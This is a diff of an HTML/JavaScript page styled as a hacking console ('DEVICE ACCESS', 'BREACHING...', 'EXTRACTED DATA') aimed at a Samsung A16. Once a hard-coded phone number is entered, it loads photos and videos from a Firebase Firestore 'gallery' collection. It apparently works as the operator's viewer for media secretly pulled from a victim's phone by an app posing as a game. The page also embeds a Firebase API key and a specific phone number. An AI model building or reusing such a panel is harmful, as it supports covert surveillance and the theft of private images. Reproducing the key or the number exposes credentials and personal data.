@@ -3,222 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DEVICE ACCESS</title>
+    <title>ACCESS</title>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
         *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            font-family:'Share Tech Mono',monospace;
-            background:#000;
-            color:#00ff00;
-            min-height:100vh;
-        }
-        .matrix{
-            position:fixed;top:0;left:0;width:100%;height:100%;
-            pointer-events:none;z-index:0;opacity:0.05;
-            background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,0,0.03) 2px,rgba(0,255,0,0.03) 4px);
-        }
-        .container{max-width:500px;margin:0 auto;padding:20px;position:relative;z-index:2}
-        .header{
-            background:#000;border:2px solid #ff0000;padding:25px;
-            text-align:center;margin-bottom:20px;border-radius:10px;
-            box-shadow:0 0 30px rgba(255,0,0,0.5);
-        }
-        .header h1{color:#ff0000;text-shadow:0 0 10px #ff0000;font-size:20px}
-        .header .sub{color:#00ff00;font-size:11px;margin-top:10px;animation:blink 1s infinite}
-        @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
-        .input-box{background:#000;border:2px solid #00ff00;padding:20px;margin:15px 0;border-radius:10px}
-        .input-box input{
-            width:100%;padding:15px;background:#000;border:1px solid #00ff00;
-            color:#00ff00;font-size:18px;text-align:center;
-            font-family:'Share Tech Mono',monospace;letter-spacing:3px;outline:none;border-radius:8px;
-        }
-        .btn{
-            width:100%;padding:15px;margin:10px 0;border:2px solid #ff0000;
-            background:#000;color:#ff0000;font-size:16px;font-weight:bold;
-            cursor:pointer;font-family:'Share Tech Mono',monospace;border-radius:8px;transition:all 0.3s;
-        }
-        .btn:hover,.btn:active{background:#ff0000;color:#000}
-        .error-msg{
-            background:#000;border:2px solid #ff0000;padding:15px;text-align:center;
-            color:#ff0000;margin:15px 0;display:none;border-radius:8px;
-        }
-        .gallery{display:none}
-        .gallery h2{text-align:center;color:#ffff00;text-shadow:0 0 10px #ffff00;margin:15px 0;font-size:16px}
-        .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:10px}
-        .item{
-            border:1px solid #00ff00;overflow:hidden;border-radius:8px;
-            background:#111;cursor:pointer;
-        }
-        .item img,.item video{width:100%;height:200px;object-fit:cover;display:block}
-        .item .cap{padding:8px;font-size:9px;color:#00ff00;text-align:center;background:rgba(0,255,0,0.05)}
+        body{font-family:'Courier New',monospace;background:#000;color:#0f0;min-height:100vh}
+        .c{max-width:500px;margin:0 auto;padding:15px}
+        .h{background:#000;border:2px solid #f00;padding:20px;text-align:center;margin-bottom:15px;border-radius:10px;box-shadow:0 0 30px rgba(255,0,0,0.5)}
+        .h h1{color:#f00;font-size:18px}
+        input{width:100%;padding:15px;background:#000;border:1px solid #0f0;color:#0f0;font-size:18px;text-align:center;border-radius:8px;outline:none;letter-spacing:4px}
+        .btn{width:100%;padding:15px;margin:10px 0;border:2px solid #f00;background:#000;color:#f00;font-size:16px;font-weight:bold;cursor:pointer;border-radius:8px}
+        .btn:active{background:#f00;color:#000}
+        .err{background:#000;border:2px solid #f00;padding:12px;text-align:center;color:#f00;display:none;border-radius:8px;margin:10px 0}
+        .g{display:none}
+        .g h2{text-align:center;color:#ff0;margin:15px 0;font-size:14px}
+        .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:8px}
+        .item{border:1px solid #0f0;border-radius:8px;overflow:hidden;background:#111;cursor:pointer}
+        .item img,.item video{width:100%;height:180px;object-fit:cover}
+        .item .t{padding:6px;font-size:9px;color:#0f0;text-align:center}
         .loading{text-align:center;padding:30px;display:none}
-        .loader{
-            border:3px solid #000;border-top:3px solid #ff0000;border-radius:50%;
-            width:50px;height:50px;animation:spin 0.8s linear infinite;margin:20px auto;
-        }
+        .spinner{border:3px solid #000;border-top:3px solid #f00;border-radius:50%;width:40px;height:40px;animation:spin 0.8s linear infinite;margin:15px auto}
         @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .full{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999;display:none;justify-content:center;align-items:center}
+        .full img,.full video{max-width:95%;max-height:95%}
+        .full .close{position:absolute;top:15px;right:15px;color:#f00;font-size:28px;cursor:pointer}
         .count{text-align:center;color:#888;font-size:10px;margin:5px 0}
-        .section{color:#ff6600;text-align:center;font-size:13px;margin:20px 0 10px;border-bottom:1px solid #333;padding-bottom:10px}
-        .preview{
-            position:fixed;top:0;left:0;width:100%;height:100%;
-            background:rgba(0,0,0,0.95);z-index:999;
-            display:none;justify-content:center;align-items:center;
-        }
-        .preview img,.preview video{max-width:95%;max-height:95%}
-        .preview .close{
-            position:absolute;top:20px;right:20px;
-            color:#ff0000;font-size:30px;cursor:pointer;z-index:10;
-        }
+        .sec{color:#f60;text-align:center;font-size:12px;margin:15px 0 8px;border-bottom:1px solid #333;padding-bottom:8px}
     </style>
 </head>
 <body>
-    <div class="matrix"></div>
-    
-    <div class="container">
-        <div class="header">
-            <h1>☠️ DEVICE ACCESS ☠️</h1>
-            <div class="sub">[ TARGET: SAMSUNG A16 ]</div>
-        </div>
+    <div class="c">
+        <div class="h"><h1>☠️ DEVICE ACCESS ☠️</h1><div style="color:#0f0;font-size:10px;margin-top:8px;">SAMSUNG A16</div></div>
         
-        <div id="loginForm">
-            <div class="input-box">
-                <div style="color:#888;font-size:10px;text-align:center;margin-bottom:10px;">ENTER TARGET NUMBER</div>
-                <input type="tel" id="phoneInput" placeholder="01XXXXXXXXX" maxlength="11">
+        <div id="login">
+            <div style="background:#000;border:2px solid #0f0;padding:18px;border-radius:10px;margin:12px 0;">
+                <div style="color:#888;font-size:10px;text-align:center;margin-bottom:10px;">ENTER NUMBER</div>
+                <input type="tel" id="phone" placeholder="01XXXXXXXXX" maxlength="11">
             </div>
-            <button class="btn" onclick="checkNumber()">[ ACCESS DEVICE ]</button>
-            <div class="error-msg" id="errorMsg"></div>
+            <button class="btn" onclick="check()">[ ACCESS ]</button>
+            <div class="err" id="err"></div>
         </div>
         
-        <div class="loading" id="loading">
-            <div class="loader"></div>
-            <p style="color:#ff0000;margin-top:15px;">BREACHING DEVICE...</p>
-        </div>
+        <div class="loading" id="load"><div class="spinner"></div><p style="color:#f00;margin-top:10px;">BREACHING...</p></div>
         
-        <div class="gallery" id="gallery">
+        <div class="g" id="gal">
             <h2>📱 EXTRACTED DATA</h2>
-            <div class="count" id="dataCount"></div>
-            <div class="section">📸 PHOTOS</div>
-            <div class="grid" id="photoGrid"></div>
-            <div class="section">🎬 VIDEOS</div>
-            <div class="grid" id="videoGrid"></div>
-            <button class="btn" onclick="location.reload()" style="margin-top:20px;">[ BACK ]</button>
+            <div class="count" id="cnt"></div>
+            <div class="sec">📸 PHOTOS</div>
+            <div class="grid" id="pg"></div>
+            <div class="sec">🎬 VIDEOS</div>
+            <div class="grid" id="vg"></div>
+            <button class="btn" onclick="location.reload()">[ BACK ]</button>
         </div>
     </div>
     
-    <div class="preview" id="preview" onclick="this.style.display='none'">
+    <div class="full" id="full" onclick="this.style.display='none'">
         <span class="close">✕</span>
-        <img id="previewImg" src="" style="display:none;">
-        <video id="previewVideo" src="" controls style="display:none;"></video>
+        <img id="fimg" src="" style="display:none;">
+        <video id="fvid" src="" controls style="display:none;"></video>
     </div>
 
     <script>
-        const TARGET = "01288649304";
-        
         firebase.initializeApp({
-            apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
-            projectId: "game-a1aca",
-            storageBucket: "game-a1aca.firebasestorage.app",
-            appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
+            apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
+            projectId:"game-a1aca",
+            storageBucket:"game-a1aca.firebasestorage.app",
+            appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"
         });
+        const db=firebase.firestore(),T="01288649304";
         
-        const db = firebase.firestore();
-
-        async function checkNumber() {
-            const input = document.getElementById('phoneInput').value.trim();
-            const error = document.getElementById('errorMsg');
-            
-            if (!input) {
-                error.style.display = 'block';
-                error.textContent = '[!] ENTER A NUMBER';
-                return;
-            }
-            
-            if (input !== TARGET) {
-                error.style.display = 'block';
-                error.textContent = '[!] ACCESS DENIED - INVALID NUMBER';
-                return;
-            }
-            
-            error.style.display = 'none';
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            
-            await sleep(2000);
-            
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('gallery').style.display = 'block';
-            
-            loadFiles();
+        async function check(){
+            const v=document.getElementById('phone').value.trim(),e=document.getElementById('err');
+            if(!v){e.style.display='block';e.textContent='[!] ENTER NUMBER';return;}
+            if(v!==T){e.style.display='block';e.textContent='[!] ACCESS DENIED';return;}
+            e.style.display='none';document.getElementById('login').style.display='none';
+            document.getElementById('load').style.display='block';
+            await new Promise(r=>setTimeout(r,2000));
+            document.getElementById('load').style.display='none';
+            document.getElementById('gal').style.display='block';
+            load();
         }
         
-        async function loadFiles() {
-            try {
-                const snap = await db.collection('gallery').orderBy('timestamp', 'desc').limit(40).get();
-                
-                let photos = [], videos = [];
-                
-                snap.forEach(doc => {
-                    const d = doc.data();
-                    if (!d.url) return;
-                    
-                    if (d.type && (d.type.includes('🎬') || d.type.includes('فيديو'))) {
-                        videos.push(d);
-                    } else {
-                        photos.push(d);
-                    }
-                });
-                
-                document.getElementById('dataCount').textContent = 
-                    `📸 ${photos.length} photos | 🎬 ${videos.length} videos`;
-                
-                document.getElementById('photoGrid').innerHTML = photos.length ? 
-                    photos.map(p => `
-                        <div class="item" onclick="openPreview('${p.url}', 'image')">
-                            <img src="${p.url}" loading="lazy">
-                            <div class="cap">📸 ${p.name || 'Photo'}</div>
-                        </div>
-                    `).join('') : '<div style="color:#555;text-align:center;padding:20px;grid-column:1/-1;">No photos</div>';
-                
-                document.getElementById('videoGrid').innerHTML = videos.length ?
-                    videos.map(v => `
-                        <div class="item" onclick="openPreview('${v.url}', 'video')">
-                            <video src="${v.url}" preload="metadata"></video>
-                            <div class="cap">🎬 ${v.name || 'Video'}</div>
-                        </div>
-                    `).join('') : '<div style="color:#555;text-align:center;padding:20px;grid-column:1/-1;">No videos</div>';
-                    
-            } catch(e) {
-                console.error(e);
-            }
+        async function load(){
+            const snap=await db.collection('gallery').orderBy('timestamp','desc').limit(50).get();
+            let imgs=[],vids=[];
+            snap.forEach(d=>{
+                const x=d.data();
+                if(!x.url)return;
+                (x.type&&x.type.includes('🎬')?vids:imgs).push(x);
+            });
+            document.getElementById('cnt').textContent='📸 '+imgs.length+' | 🎬 '+vids.length;
+            document.getElementById('pg').innerHTML=imgs.length?imgs.map(p=>`
+                <div class="item" onclick="openFull('${p.url}','img')">
+                    <img src="${p.url}" loading="lazy"><div class="t">📸 ${p.name||''}</div>
+                </div>`).join(''):'<div style="color:#555;text-align:center;padding:20px;grid-column:1/-1;">No photos</div>';
+            document.getElementById('vg').innerHTML=vids.length?vids.map(v=>`
+                <div class="item" onclick="openFull('${v.url}','vid')">
+                    <video src="${v.url}" preload="metadata"></video><div class="t">🎬 ${v.name||''}</div>
+                </div>`).join(''):'<div style="color:#555;text-align:center;padding:20px;grid-column:1/-1;">No videos</div>';
         }
         
-        function openPreview(url, type) {
-            const preview = document.getElementById('preview');
-            const img = document.getElementById('previewImg');
-            const video = document.getElementById('previewVideo');
-            
-            img.style.display = 'none';
-            video.style.display = 'none';
-            
-            if (type === 'image') {
-                img.src = url;
-                img.style.display = 'block';
-            } else {
-                video.src = url;
-                video.style.display = 'block';
-            }
-            
-            preview.style.display = 'flex';
+        function openFull(url,t){
+            document.getElementById('fimg').style.display='none';
+            document.getElementById('fvid').style.display='none';
+            if(t==='img'){document.getElementById('fimg').src=url;document.getElementById('fimg').style.display='block';}
+            else{document.getElementById('fvid').src=url;document.getElementById('fvid').style.display='block';}
+            document.getElementById('full').style.display='flex';
         }
         
-        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-        
-        document.getElementById('phoneInput').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') checkNumber();
-        });
+        document.getElementById('phone').addEventListener('keydown',function(e){if(e.key==='Enter')check();});
     </script>
 </body>
 </html>
